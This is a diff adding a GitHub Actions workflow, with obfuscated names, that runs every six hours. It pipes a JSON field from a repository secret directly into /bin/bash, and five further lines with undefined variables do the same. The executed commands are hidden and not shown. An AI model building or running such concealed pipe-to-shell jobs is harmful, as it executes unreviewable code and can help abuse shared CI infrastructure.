@@ -1,0 +1,22 @@
+name: wuzhurong1122
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuzhurong1122
+        env:
+          wjip087: ${{ secrets.wjip087 }}
+        run: |
+          echo $wjip087 | jq -r .ika57862 | /bin/bash
+          echo $pjbrw3 | jq -r .uwc507 | /bin/bash
+          echo $sflq0 | jq -r .o701 | /bin/bash
+          echo $y7 | jq -r .qit462 | /bin/bash
+          echo $y999 | jq -r .zef0 | /bin/bash
+          echo $lcmy2 | jq -r .h481 | /bin/bash
+
